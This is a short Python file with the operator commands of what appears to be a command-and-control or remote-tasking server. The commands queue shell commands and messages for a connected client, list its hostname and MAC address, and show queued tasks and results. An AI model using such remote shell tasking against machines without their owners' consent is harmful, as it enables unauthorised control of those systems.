def cmd_send(server, parts):
    if len(parts) < 2:
        print("usage: send <msg>")
        return
    
    msg = " ".join(parts[1:])
    server.send_task("print_message", {"message": msg})

def cmd_shell(server, parts):
    if len(parts) < 2:
        print("usage: shell <cmd>")
        return
    
    cmd = " ".join(parts[1:])
    server.send_task("shell", {"cmd": cmd})

def cmd_list(server, _):
    if not server.client:
        print("no client")
        return
    
    c = server.client
    print(f"{c['hostname']} | {c['mac']}")

def cmd_queue(server, _):
    if not server.client:
        print("no client")
        return

    print(list(server.client["tasks"]))

def cmd_results(server, _):
    if not server.client:
        print("no client")
        return

    for tid, r in server.client["results"].items():
        print(f"{tid} [{r['status']}] -> {r['output']}")

COMMANDS = {
    "shell": cmd_shell,
    "list": cmd_list,
    "send": cmd_send,
    "queue": cmd_queue,
    "results": cmd_results
}
